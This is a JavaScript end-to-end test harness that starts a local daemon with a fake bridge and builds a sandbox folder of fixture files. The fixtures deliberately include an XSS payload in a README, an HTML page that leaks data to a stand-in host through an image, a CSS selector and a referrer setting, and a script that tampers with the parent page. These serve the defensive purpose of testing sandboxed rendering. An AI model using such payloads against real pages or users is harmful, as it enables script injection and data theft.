// SPDX-License-Identifier: AGPL-3.0-only OR LicenseRef-Commercial
// The harness of e2e_panel.mjs: a sandbox folder, a private fbd on port 47832 with a fake
// bridge (states, heartbeat, command answers), and the check helpers.

import { spawn } from "node:child_process";
import fs from "node:fs";
import os from "node:os";
import path from "node:path";

export const PORT = 47832, SECRET = "e2e-bridge-secret-0123456789";
const HERE = path.dirname(new URL(import.meta.url).pathname);
export const FBD = process.env.FB_BIN ?? path.resolve(HERE, "../../fbd/target/debug/fbd");
export const SB = fs.realpathSync(fs.mkdtempSync("/tmp/fb-e2e-")); // /tmp is a writable root; $TMPDIR is not
const APP = fs.mkdtempSync(path.join(os.tmpdir(), "fb-e2e-app-"));   // private token + workspaces

// ── sandbox ──────────────────────────────────────────────────────────────────
fs.mkdirSync(`${SB}/src`); fs.mkdirSync(`${SB}/docs`);
fs.writeFileSync(`${SB}/README.md`, "# Sandbox\n\nSee [guide](docs/guide.md) and [web](https://example.com).\n\n![logo](docs/logo.png)\n\n<img src=x onerror=alert(1)>\n");
fs.writeFileSync(`${SB}/docs/guide.md`, "# Guide\n\nBack to [readme](../README.md#sandbox) or [the page](page.html#sec2).\n");
fs.writeFileSync(`${SB}/docs/page.html`, '<!doctype html><title>Page</title><h1>HTML page</h1><p><a href="../README.md#sandbox">to readme</a> <a href="guide.md">to guide</a></p><img src="logo.png"><img src="http://leak.example.invalid/x.png"><meta name="referrer" content="unsafe-url"><style>img[src*="t="]{background:url(http://leak.example.invalid/css)}</style><script>parent.document.title="PWNED"</script><div style="height:3000px"></div><p id="sec2">Section two</p>');
fs.writeFileSync(`${SB}/src/main.rs`, 'fn main() {\n    println!("hi");\n}\n');
fs.writeFileSync(`${SB}/app.py`, "print(1)\n");
for (const f of "abcde") fs.writeFileSync(`${SB}/${f}.log`, f);
for (const d of ["src/a/b", "node_modules/x", ".git/objects"]) fs.mkdirSync(`${SB}/${d}`, { recursive: true });
// a 1×1 PNG
fs.writeFileSync(`${SB}/docs/logo.png`, Buffer.from("iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVR42mP8z8BQDwAEhQGAhKmMIQAAAABJRU5ErkJggg==", "base64"));

// ── backend with a fake bridge ───────────────────────────────────────────────
export const base = `http://127.0.0.1:${PORT}`;
/** Start the private fbd (again); `env` plays another build (FB_BUILD_ID) for AC-34. */
// fbd plays the build the UI bundle was made for, or every panel would reload itself (AC-34)
const UI_BUILD = fs.readFileSync(path.resolve(HERE, "../.build-id"), "utf8").trim();
async function startFbd(env = {}) {
  const p = spawn(FBD, [], { env: { ...process.env, FB_PORT: String(PORT), FB_BRIDGE_SECRET: SECRET, FB_APP_DIR: APP, FB_LOG: "warn", FB_BUILD_ID: UI_BUILD, ...env }, stdio: ["ignore", "ignore", "inherit"] });
  for (let i = 0; i < 50; i++) { try { await fetch(base + "/"); break; } catch { await new Promise((r) => setTimeout(r, 100)); } }
  return p;
}
let fbd = await startFbd();
export const stopFbd = () => new Promise((r) => { fbd.once("exit", r); fbd.kill(); });
export const TOKEN = fs.readFileSync(path.join(APP, "token"), "utf8").trim();
let focus = null;
/** A call only the bridge may make (the fake bridge's secret). */
export const internal = (p, body) => fetch(base + p, { method: "POST", headers: { "Content-Type": "application/json", "X-FB-Bridge": SECRET }, body: JSON.stringify(body) });
/** The fake bridge reports pane `key` in `cwd`, in iTerm2 window `window` (`panel`: it shows
 *  its Toolbelt), on remote `host` if given (AC-37). The heartbeat repeats the last one. */
export const push = (key, cwd, window = "w1", panel = true, host = undefined, extra = {}) => (focus = [key, cwd, window, panel, host, extra],
  internal("/internal/state", { key, session: key, cwd, window, panel, host, mode: host ? "remote" : "bash", title: `e2e ${key}`, note: "fake bridge", stale: false, ...extra }));
await push("e2eA", SB);
// the fake bridge's command stream: record commands, answer "which window is key" (AC-36)
export const cmds = [];
let commands = new AbortController();
const listenCommands = () => void fetch(base + "/internal/commands", { headers: { "X-FB-Bridge": SECRET }, signal: commands.signal }).then(async (r) => {
  const reader = r.body.getReader(); const dec = new TextDecoder();
  for (;;) {
    const { value, done } = await reader.read(); if (done) break;
    for (const line of dec.decode(value).split("\n")) {
      if (!line.startsWith("data:")) continue;
      const c = JSON.parse(line.slice(5));
      cmds.push(c);
      if (c.action === "which-window") void internal("/internal/bound", { req: c.req, window: focus[2], panel: focus[3] });
    }
  }
}).catch(() => {});
listenCommands();
/** fbd is back (`env`: as another build); so is the fake bridge. */
export async function bringBack(env = {}) {
  fbd = await startFbd(env);
  commands.abort(); commands = new AbortController(); listenCommands();
  await push(...focus);
}
/** fbd goes away for `gapMs` (a restart); `during` runs meanwhile. */
export async function restartFbd(gapMs, during = () => {}) {
  await stopFbd();
  during();
  await new Promise((r) => setTimeout(r, gapMs));
  await bringBack();
}
// like the real bridge: repeat the state every 3 s, or fbd reports it silent after 10 s (AC-30)
const heartbeat = setInterval(() => void push(...focus).catch(() => {}), 3000);

export const results = [];
export const check = (name, ok, extra = "") => { results.push(ok); console.log(`${ok ? "PASS" : "FAIL"} ${name}${extra ? " — " + extra : ""}`); };
export const within = async (name, fn, ms = 5000) => {
  const t0 = Date.now();
  try { await fn(ms); check(name, true, `${Date.now() - t0} ms`); } catch (e) { check(name, false, e.message.split("\n")[0]); }
};


/** The fake bridge falls silent (AC-30): no heartbeat, no command stream. */
export function silence() { clearInterval(heartbeat); commands.abort(); }
/** The fake bridge reports the last state again. */
export const resume = () => push(...focus);
export function cleanup() {
  clearInterval(heartbeat);
  fbd.kill();
  fs.rmSync(SB, { recursive: true, force: true });
  fs.rmSync(APP, { recursive: true, force: true });
}
